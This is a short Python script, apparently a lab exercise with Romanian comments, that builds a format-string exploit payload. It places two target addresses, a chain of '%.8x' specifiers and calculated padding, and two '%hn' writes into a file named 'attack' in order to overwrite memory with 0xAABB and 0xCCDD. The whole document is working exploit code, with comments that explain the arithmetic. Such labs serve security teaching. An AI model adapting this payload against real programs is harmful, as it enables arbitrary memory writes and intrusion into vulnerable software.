#!/usr/bin/python3
import sys

# Initialize the content array
                                                            
content = bytearray(0x0 for i in range(12 + 62*5 + 8 + 3 + 7 + 3))   
#se pune adresa in codul format 
address1  = 0x080e506A                                       #prima adresa a valorii
content[0:4]  =  (address1).to_bytes(4,byteorder='little')   #se pune adresa in stringul de input
dummy = "xxxx".encode('latin-1')                             # se formeaza un octet pe care il afisam intre cei doi specifcatori %hn si %hn cu %x 
                                                             # si padding-ul corespunzator constructiei valorii pentru a doua adresa
content[4:8] = dummy
address2  = 0x080e5068                                        #a doua adresa a valorii
content[8:12]  =  (address2).to_bytes(4,byteorder='little')   #se pune adresa in stringul de input
                                                              #pana aici vor fi 4 + 4 + 4 = 12 caractere afisate
s = "%.8x_"*62                                                #se acceseaza cei 62 de octeti, urmand ca al 64-lea sa i se adauge padding pana cand
fmt  = (s).encode('latin-1')                                  #se ajunge la un numar de 0xAABB octeti afisati (43707)
content[12:12+len(fmt)] = fmt                                 # vor fi 62 * 9 = 558 de caractere afiate => PANA ACUM SUNT 570 de caractere
intermediate_length = 12 + len(fmt)                                              
                                                              #mai trebuie 43707 - 570 = 43137
fmt_64 = ("%.43137x").encode('latin-1')                       #cel de-al 63-specificator va avea un padding care sa acopere cele 43137 ramase
content[intermediate_length:intermediate_length+len(fmt_64)] = fmt_64 
intermediate_length = intermediate_length + len(fmt_64)       #se recalculeaza valoarea de sfarsit a sirului
###################
#se pune primul %hn
###################
fmt_hn =  ("%hn").encode('latin-1')                           #se pune primul speficator de tipu %hn care va copia in prima adresa valoarea 0xAABB
content[intermediate_length: intermediate_length +len(fmt_hn)] = fmt_hn
intermediate_length = intermediate_length + len(fmt_hn)
##########################################
#se pune paddingul necesare pentru afisarea caractrerelor 0xCCDD-0xAABB = 0x2222 => 8738 de caractere trebuie afisate
ftm_between = ("%.8738x").encode('latin-1') 
content[intermediate_length: intermediate_length +len(ftm_between)] = ftm_between
intermediate_length = intermediate_length + len(ftm_between)
###################
#se al doilea %hn
###################
fmt_hn =  ("%hn").encode('latin-1')                        #se pune al doilea speficator de tipul %hn care va copia in prima adresa valoarea 0xCCDD
content[intermediate_length: intermediate_length +len(fmt_hn)] = fmt_hn
# Write the content to badfile
with open('attack', 'wb') as f:                            #se scrie in fisier valoarea
  f.write(content)